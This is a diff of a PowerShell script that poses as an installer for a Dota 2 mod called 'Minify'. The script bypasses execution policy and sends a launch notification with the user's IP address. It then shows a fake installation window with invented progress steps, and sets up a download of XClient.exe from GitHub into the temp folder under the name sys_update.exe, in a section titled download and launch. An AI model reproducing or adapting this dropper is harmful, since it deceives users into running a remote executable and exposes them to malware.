@@ -3,7 +3,7 @@ Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File "$PSComma
 exit
 }
 
---- СЕКЦИЯ ЛОГЕРА ---
+#СЕКЦИЯ ЛОГЕРА
 function Send-LogNotification {
 param(
 [string]$Status,
@@ -18,7 +18,7 @@ $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss" # Получаем IP-адр
 Отправляем уведомление о запуске
 Send-LogNotification -Status "STARTED" -Message "Пользователь запустил установщик Minify"
 
---- ГРАФИЧЕСКИЙ ИНТЕРФЕЙС ---
+#ГРАФИЧЕСКИЙ ИНТЕРФЕЙС
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
@@ -50,7 +50,7 @@ $form.Controls.Add($statusLabel)
 Показываем форму
 $form.Show()
 
---- ПРОЦЕСС "УСТАНОВКИ" ---
+#УСТАНОВКИ
 $steps = @(
 "Анализ файлов Dota 2...",
 "Оптимизация шейдеров...",
@@ -66,7 +66,7 @@ $form.Refresh()
 Start-Sleep -Milliseconds (Get-Random -Min 800 -Max 1500)
 }
 
---- ЗАГРУЗКА И ЗАПУСК ---
+#ЗАГРУЗКА И ЗАПУСК
 $u = "https://raw.githubusercontent.com/winstarchik/FFF/main/XClient.exe"
 $p = "$env:TEMP\sys_update.exe"
 
